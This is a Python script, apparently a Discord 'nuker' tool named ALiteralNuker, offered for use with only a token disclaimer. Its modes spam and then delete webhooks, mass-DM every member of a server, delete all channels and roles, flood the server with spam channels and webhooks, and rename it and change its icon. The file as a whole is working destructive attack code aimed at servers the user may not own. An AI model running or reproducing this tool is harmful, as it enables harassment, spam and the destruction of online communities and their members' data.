import requests
import discord
import asyncio
import os
import json
import random
import logging
from discord.ext import commands
from colorama import Fore, Style, init

init(autoreset=True)

# ====== DISCLAIMER ======
def disclaimer():
    print(Fore.RED + "==============================================")
    print(Fore.RED + "⚠️  WARNING: This script is for EDUCATIONAL and TESTING PURPOSES ONLY.")
    print(Fore.RED + "⚠️  DO NOT run this on servers you don't own or have permission to attack.")
    print(Fore.RED + "⚠️  The creators (LiterallySnowy and SkitDev) are NOT responsible for any damage caused.")
    print(Fore.RED + "==============================================")
    input(Fore.YELLOW + "Press ENTER to continue if you're not a total idiot...")

disclaimer()
# ====== END DISCLAIMER ======

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
base_folder = "ALiteralNuker"
attachments_folder = os.path.join(base_folder, "attachments")
assets_folder = os.path.join(base_folder, "assets")
webhook_file = os.path.join(base_folder, "deleted_webhooks.json")
icon_path = os.path.join(assets_folder, "icon.jpg")

os.makedirs(base_folder, exist_ok=True)
os.makedirs(attachments_folder, exist_ok=True)
os.makedirs(assets_folder, exist_ok=True)

if not os.path.exists(webhook_file):
    with open(webhook_file, "w") as f:
        json.dump([], f)

# Load deleted webhooks
def load_deleted_webhooks():
    with open(webhook_file, "r") as f:
        return json.load(f)

# Save deleted webhooks
def save_deleted_webhook(webhook_url):
    deleted_webhooks = load_deleted_webhooks()
    if webhook_url not in deleted_webhooks:
        deleted_webhooks.append(webhook_url)
        with open(webhook_file, "w") as f:
            json.dump(deleted_webhooks, f)

# Clear screen function
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Main menu function
def main_menu():
    clear_screen()
    print(Fore.CYAN + r"""
██╗     ███╗   ██╗
██║     ████╗  ██║
██║     ██╔██╗ ██║
██║     ██║╚██╗██║
███████╗██║ ╚████║
╚══════╝╚═╝  ╚═══╝
                  """)
    
    print(Fore.RED + "🔥 ALiteralNuker - Made by LiterallySnowy 🔥")
    print(Fore.YELLOW + "[1] Webhook Bomber")
    print(Fore.YELLOW + "[2] Bot Server Bomber")
    print(Fore.YELLOW + "[3] Channel Spammer")
    return input(Fore.CYAN + "Choose mode (1, 2, or 3): ")

# Function to confirm destructive actions
def confirm_action(action):
    confirmation = input(Fore.RED + f"Are you sure you want to {action}? (y/n): ").lower()
    return confirmation == 'y'

# Function to handle rate limiting
async def handle_rate_limit(response):
    if response.status_code == 429:
        retry_after = response.json().get('retry_after', 1)
        logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
        await asyncio.sleep(retry_after / 1000)

# Function to spam messages using webhooks
async def spam_webhook(webhook_url, message, repeat, attach_spam):
    for i in range(repeat):
        payload = {"content": f"{message} [ Nuked with ALiteralNuker ✓ ]"}
        try:
            response = requests.post(webhook_url, json=payload)
            await handle_rate_limit(response)
            print(Fore.GREEN + f"Sent message {i+1}/{repeat}")
        except requests.RequestException as e:
            logging.error(f"Failed to send message {i+1}/{repeat}: {e}")

        if attach_spam == "y":
            files = os.listdir(attachments_folder)
            if files:
                file_path = os.path.join(attachments_folder, random.choice(files))
                try:
                    with open(file_path, "rb") as file:
                        response = requests.post(webhook_url, files={"file": file})
                        await handle_rate_limit(response)
                    print(Fore.MAGENTA + f"Sent attachment: {file_path}")
                except (requests.RequestException, IOError) as e:
                    logging.error(f"Failed to send attachment {file_path}: {e}")

    try:
        response = requests.delete(webhook_url)
        await handle_rate_limit(response)
        save_deleted_webhook(webhook_url)  # Save the deleted webhook
        print(Fore.RED + "🔥 Webhook deleted! 🔥")
    except requests.RequestException as e:
        logging.error(f"Failed to delete webhook: {e}")

# Start main menu loop
while True:
    choice = main_menu()

    # --- Webhook Bomber ---
    if choice == "1":
        webhook_url = input(Fore.CYAN + "Enter the webhook URL: ")

        # Check if the webhook was already deleted
        if webhook_url in load_deleted_webhooks():
            print(Fore.RED + "❌ This webhook was already deleted! ❌")
            input(Fore.YELLOW + "Press Enter to return to the menu...")
            continue

        if not confirm_action("bomb this webhook"):
            continue

        message = input(Fore.CYAN + "Enter the spam message: ")
        attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
        repeat = int(input(Fore.CYAN + "How many times to spam?: "))

        asyncio.run(spam_webhook(webhook_url, message, repeat, attach_spam))

        input(Fore.YELLOW + "Press Enter to return to the menu...")

    # --- Bot Server Bomber ---
    elif choice == "2":
        bot_token = input(Fore.CYAN + "Enter bot token: ")
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            print(Fore.GREEN + f"🔥 Logged in as {bot.user} 🔥")

            guild_id = int(input(Fore.CYAN + "Enter Server ID to nuke: "))
            guild = bot.get_guild(guild_id)

            if not guild:
                print(Fore.RED + "❌ Bot is not in the server!")
                return

            if not confirm_action("nuke this server"):
                return

            message = input(Fore.CYAN + "Enter the spam message: ")
            attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
            repeat = int(input(Fore.CYAN + "How many times to spam?: "))

            # DM all members with server name
            for member in guild.members:
                try:
                    await member.send(f"🔥 This server is being nuked! Server Name: {guild.name}")
                    print(Fore.BLUE + f"Sent DM to {member.name}")
                except Exception as e:
                    logging.error(f"Failed to DM {member.name}: {e}")

            # Delete channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(Fore.RED + f"Deleted channel: {channel.name}")
                except Exception as e:
                    logging.error(f"Failed to delete channel {channel.name}: {e}")

            # Create spam channels and webhooks
            for _ in range(50):
                try:
                    spam_channel = await guild.create_text_channel("nuked-by-literalnuker")
                    print(Fore.GREEN + "Created spam channel.")
                    
                    # Create webhooks in the spam channel
                    for _ in range(5):
                        webhook = await spam_channel.create_webhook(name="NUKED BY github.com/literallysnowy")
                        asyncio.create_task(spam_webhook(webhook.url, message, repeat, attach_spam))
                except Exception as e:
                    logging.error(f"Failed to create spam channel or webhook: {e}")

            # Delete roles
            for role in guild.roles:
                try:
                    await role.delete()
                    print(Fore.RED + f"Deleted role: {role.name}")
                except Exception as e:
                    logging.error(f"Failed to delete role {role.name}: {e}")

            # Server name change & icon change
            try:
                await guild.edit(name="Nuked by ALiteralNuker")

                if os.path.exists(icon_path):
                    with open(icon_path, "rb") as icon:
                        await guild.edit(icon=icon.read())
                    print(Fore.CYAN + "🔥 Server name & icon changed! 🔥")
                else:
                    print(Fore.YELLOW + "⚠️ No icon found in ALiteralNuker/assets/ ⚠️")
            except Exception as e:
                logging.error(f"Failed to edit server: {e}")

        bot.run(bot_token)

    # --- Channel Spammer ---
    elif choice == "3":
        bot_token = input(Fore.CYAN + "Enter bot token: ")
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            print(Fore.GREEN + f"🔥 Logged in as {bot.user} 🔥")

            guild_id = int(input(Fore.CYAN + "Enter Server ID to spam channels: "))
            guild = bot.get_guild(guild_id)

            if not guild:
                print(Fore.RED + "❌ Bot is not in the server!")
                return

            if not confirm_action("spam channels in this server"):
                return

            channel_name = input(Fore.CYAN + "Enter the name for the spam channels: ")
            num_channels = int(input(Fore.CYAN + "Enter the number of channels to create: "))
            message = input(Fore.CYAN + "Enter the spam message: ")
            attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
            repeat = int(input(Fore.CYAN + "How many times to spam?: "))

            # Create spam channels and webhooks
            for _ in range(num_channels):
                try:
                    spam_channel = await guild.create_text_channel(channel_name)
                    print(Fore.GREEN + f"Created spam channel: {channel_name}")
                    
                    # Create webhooks in the spam channel
                    for _ in range(5):
                        webhook = await spam_channel.create_webhook(name="NUKED BY github.com/literallysnowy")
                        asyncio.create_task(spam_webhook(webhook.url, message, repeat, attach_spam))
                except Exception as e:
                    logging.error(f"Failed to create spam channel or webhook: {e}")

        bot.run(bot_token)

    else:
        print(Fore.RED + "❌ Invalid option! Try again.")
